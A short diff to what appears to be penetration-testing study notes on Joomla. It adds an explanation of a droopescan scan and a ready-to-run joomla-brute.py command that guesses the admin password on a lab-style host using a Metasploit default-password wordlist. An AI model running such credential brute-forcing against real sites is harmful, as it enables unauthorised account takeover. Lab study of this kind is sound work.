@@ -8,3 +8,8 @@ url -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
 ```
 
 `droopescan scan joomla --url http://<domainnameoripaddress>`
+Runs `droopescan` against a joomla site located at the specified url
+```
+sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`)
